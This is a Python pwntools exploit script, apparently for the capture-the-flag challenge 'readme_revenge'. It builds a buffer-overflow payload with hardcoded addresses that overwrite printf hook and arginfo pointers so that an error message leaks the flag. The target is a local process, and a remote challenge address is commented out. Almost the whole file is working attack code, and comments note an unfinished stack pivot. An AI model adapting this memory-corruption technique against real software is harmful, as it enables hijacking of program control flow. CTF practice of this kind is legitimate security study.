#coding:utf-8
from pwn import *

#p = remote("35.198.130.245", 1337)
p = process("./readme_revenge")
#raw_input()


#name = "A"*920
name = p64(0x00)	# Pass NULL Check.
name += "XXXX"
name += p64(0x0)
name += p64(0x6b4040)
name += "B"*24
#name = name.ljust(920,"C")
name += "C"*316
name += p64(0x46b980)   # dlscope_free
#name += "X"*8		# RIP Control ; call rax in __printf_arginfo ;
name = name.ljust(920,"C")

# NEED to somehow pivot --> either control RCX or call other hook function.

print str(len(name))
name += p64(0x46b980)	# NULL Check # YES
name += "D"*160
name += p64(0x6b4040)	# N
name += "D"*(512-168)
name += p64(0x6b73f4)	# N
name = name.ljust(1608,"G")
name += p64(0x6b4040)*2	# NULL Check
name += "E"*104
name += "F"*8
name += p64(0x6b73e0)
#name += p64(0x6b4040)	# NULL Check
name += "X"*40

p.sendline(name)
# Error message prints flag
p.interactive()
